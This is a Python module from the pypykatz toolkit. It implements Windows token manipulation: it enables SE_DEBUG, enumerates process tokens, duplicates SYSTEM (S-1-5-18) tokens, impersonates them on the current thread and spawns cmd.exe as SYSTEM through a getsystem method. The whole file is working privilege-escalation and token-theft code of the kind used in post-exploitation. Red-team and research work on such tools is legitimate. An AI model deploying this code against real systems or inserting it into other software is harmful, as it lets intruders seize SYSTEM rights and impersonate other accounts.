#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import platform
from pypykatz import logger

from pypykatz.commons.winapi.local.localwindowsapi import LocalWindowsAPI
from pypykatz.commons.winapi.constants import *

class TokenInfo:
	def __init__(self, pid, domain, username, sid, token_type):
		self.pid = pid
		self.domain = domain
		self.username = username
		self.sid = sid
		self.token_type = token_type
		
	def __str__(self):
		return '%s:%s:%s:%s:%s' % (self.pid,self.domain,self.username,self.sid,self.token_type)

class ProcessManipulator:
	"""
	High level class to adjust privileges and manipulate tokens
	TODO: Currently only working with the current process, doesn't do remote processes!
	TODO: ther ways to get system, eg. creating a service that will launch the new app? like p s e x e c
	"""
	def __init__(self, pid = None, api = None):
		self.pid = pid
		self.api = api if api is not None else LocalWindowsAPI()
	
	def set_privilege(self, privilige_id, thread_or_process = False):
		"""
		Sets a given privilege
		"""
		logger.debug('[ProcessManipulator] Setting %s privilege' % privilige_id)
		return self.api.ntdll.RtlAdjustPrivilege(privilige_id, enable = True, thread_or_process = thread_or_process)
		
	def drop_privilege(self, privilige_id, thread_or_process = False):
		"""
		Drops the given privilege
		"""
		logger.debug('[ProcessManipulator] Dropping %s privilege' % privilige_id)
		self.api.ntdll.RtlAdjustPrivilege(privilige_id, enable = False, thread_or_process = thread_or_process)
		
	def list_privileges(self):
		"""
		Lists all available privileges for the current user
		"""
		pass

		
	def list_all_tokens(self, force = False):
		"""
		iterates trough all available processes, fetches all process tokens, gets user information for all tokens
		"""
		logger.debug('[ProcessManipulator] Listing all tokens...')
		try:
			res = self.set_privilege(SE_DEBUG)
		except Exception as e:
			if force is False:
				logger.error('Failed to obtain SE_DEBUG privilege!')
				raise e
			else:
				pass
				
		token_infos = []
		for pid in self.api.psapi.EnumProcesses():
			proc_handle = None
			try:
				proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
				logger.log(1, '[ProcessManipulator] Proc handle for PID %s is: %s' % (proc_handle, pid))
			except Exception as e:
				logger.log(1, '[ProcessManipulator] Failed to open process pid %s Reason: %s' % (pid, str(e)))
				continue
			
			else:
				token_handle = None
				try:
					token_handle = self.api.advapi32.OpenProcessToken(proc_handle, TOKEN_MANIP_ACCESS)
				except Exception as e:
					logger.log(1, '[ProcessManipulator] Failed get token from process pid %s Reason: %s' % (pid, str(e)))
					continue
				else:
					ti = self.get_token_info(token_handle, pid)
					token_infos.append(ti)
					
				finally:
					if token_handle is not None:
						self.api.kernel32.CloseHandle(token_handle)
			
			finally:
				if proc_handle is not None:
					self.api.kernel32.CloseHandle(proc_handle)
		
		return token_infos
		
	def get_current_token_info(self):
		proc_handle = None
		try:
			pid = self.api.kernel32.GetCurrentProcessId()
			proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
		except Exception as e:
			raise e
		else:
			try:
				token_handle = self.api.advapi32.OpenProcessToken(proc_handle, TOKEN_MANIP_ACCESS)
				return self.get_token_info(token_handle, pid)
			except Exception as e:
				raise e
			finally:
				if token_handle is not None:
					self.api.kernel32.CloseHandle(token_handle)
		finally:
			if proc_handle is not None:
				self.api.kernel32.CloseHandle(proc_handle)
					
	def get_token_info(self, token_handle, pid):
		ptr_sid = self.api.advapi32.GetTokenInformation_sid(token_handle)
		sid_str = self.api.advapi32.ConvertSidToStringSid(ptr_sid)
		name, domain, token_type = self.api.advapi32.LookupAccountSid(None, ptr_sid)
		return TokenInfo(pid, domain, name, sid_str, token_type)
		
	def get_token_for_sid(self, target_sid = 'S-1-5-18', dwDesiredAccess = TOKEN_ALL_ACCESS, ImpersonationLevel = SecurityImpersonation, TokenType = SecurityImpersonation):
		"""
		iterates trough all available processes, fetches all process tokens, checks if sid matches for token, duplicates it and yields them
		also leaks a lot of handles, probably should be cleaned up TODO
		"""
		#LookupAccountSidA
		try:
			self.set_privilege(SE_DEBUG)
		except Exception as e:
			logger.error('Failed to obtain SE_DEBUG privilege!')
			raise e
		
		token_infos = []
		for pid in self.api.psapi.EnumProcesses():
			proc_handle = None
			try:
				proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
				logger.log(1, '[ProcessManipulator] Proc handle for PID %s is: %s' % (proc_handle, pid))
			except Exception as e:
				logger.log(1, '[ProcessManipulator] Failed to open process pid %s Reason: %s' % (pid, str(e)))
				continue
			
			else:
				token_handle = None
				try:
					token_handle = self.api.advapi32.OpenProcessToken(proc_handle, TOKEN_MANIP_ACCESS)
				except Exception as e:
					logger.log(1, '[ProcessManipulator] Failed get token from process pid %s Reason: %s' % (pid, str(e)))
					continue
				else:
					ptr_sid = self.api.advapi32.GetTokenInformation_sid(token_handle)
					sid_str = self.api.advapi32.ConvertSidToStringSid(ptr_sid)
					if sid_str == target_sid:
						logger.debug('[ProcessManipulator] Found token with target sid!')
						cloned_token = self.api.advapi32.DuplicateTokenEx(
							token_handle, 
							dwDesiredAccess = dwDesiredAccess, 
							ImpersonationLevel = ImpersonationLevel, 
							TokenType = TokenType
						)
						yield cloned_token
						
				finally:
					if token_handle is not None:
						self.api.kernel32.CloseHandle(token_handle)
			
			finally:
				if proc_handle is not None:
					self.api.kernel32.CloseHandle(proc_handle)
		
		return token_infos
		
	def assign_token_thread_sid(self, target_sid = 'S-1-5-18'):
		"""
		assigns the token to the thread specified by threadid, if threadid is none then it will use the current thread
		"""
		for token in self.get_token_for_sid(target_sid = target_sid, dwDesiredAccess = TOKEN_QUERY | TOKEN_IMPERSONATE, ImpersonationLevel = SecurityDelegation, TokenType = TokenImpersonation):
			logger.debug('[ProcessManipulator] Setting token to current thread...')
			try:
				self.api.advapi32.SetThreadToken(token)
			except Exception as e:
				logger.log(1, 'Failed changing the thread token. Reason: %s' % e)
				continue
			else:
				logger.debug('[ProcessManipulator] Sucsessfully set token to current thread!')
				break
		
	def create_process_for_sid(self, target_sid = 'S-1-5-18', cmdline = 'C:\\Windows\\system32\\cmd.exe', interactive = True):
		"""
		Creates a new process with the token of the target SID 
		TODO: implement non-interactive functionality :(
		"""
		for token in self.get_token_for_sid(target_sid = target_sid, dwDesiredAccess = TOKEN_ALL_ACCESS, ImpersonationLevel = SecurityImpersonation, TokenType = TokenImpersonation):
			try:
				self.api.advapi32.CreateProcessWithToken_manip(token, cmdline)
			except Exception as e:
				logger.log(1, 'Failed creating process with the token obtained. Reason: %s' % e)
				continue
			else:
				logger.debug('[ProcessManipulator] Sucsessfully created process!')
				break

	def getsystem(self):
		self.assign_token_thread_sid('S-1-5-18')

	def dropsystem(self):
		self.api.advapi32.RevertToSelf()
		
if __name__ == '__main__':
	pm = ProcessManipulator()
	#pm.set_privilege(10)
	#for ti in pm.list_all_tokens():
	#	print(str(ti))
	
	#pm.create_process_for_sid()
	#pm.assign_token_thread_sid()
	ti = pm.get_current_token_info()
	print(str(ti))
	
	